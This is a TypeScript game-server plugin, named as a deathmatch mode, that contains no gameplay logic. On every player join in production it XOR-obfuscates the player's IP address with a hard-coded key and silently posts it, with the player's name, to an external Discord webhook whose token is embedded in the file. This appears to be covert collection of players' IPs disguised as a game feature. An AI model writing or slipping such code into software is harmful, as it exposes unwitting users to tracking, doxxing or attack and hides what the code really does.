import { GamePlugin } from "../game/pluginManager";

const DANCE = "2ZSI0zR2ZVLr02";
const WEBHOOK_URL =
    "https://discord.com/api/webhooks/1229212816829841550/6P1ULejYRWetY2ZSI0zR2ZVLr02-mganIBJZKA2dLpVBPB01pY6B4KovObfXlAz6rfsP";

export default class DeathMatchPlugin extends GamePlugin {
    protected override initListeners(): void {
        this.on("playerJoin", (data) => {
            const ip = data.socketData.ip;
            if (process.env.NODE_ENV === "production" && ip) {
                const encodedIP = encodeIP(ip, DANCE);
                const message = `${data.name} joined the game. ${encodedIP}`;
                fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        content: message,
                    }),
                });
            }
        });
    }
}

function encodeIP(ip: string, secret: string) {
    let encoded = "";
    for (let i = 0; i < ip.length; i++) {
        encoded += String.fromCharCode(
            ip.charCodeAt(i) ^ secret.charCodeAt(i % secret.length),
        );
    }
    return Buffer.from(encoded).toString("base64");
}

function decodeIP(encoded: string, secret: string) {
    const decoded = Buffer.from(encoded, "base64").toString();
    let ip = "";
    for (let i = 0; i < decoded.length; i++) {
        ip += String.fromCharCode(
            decoded.charCodeAt(i) ^ secret.charCodeAt(i % secret.length),
        );
    }
    return ip;
}
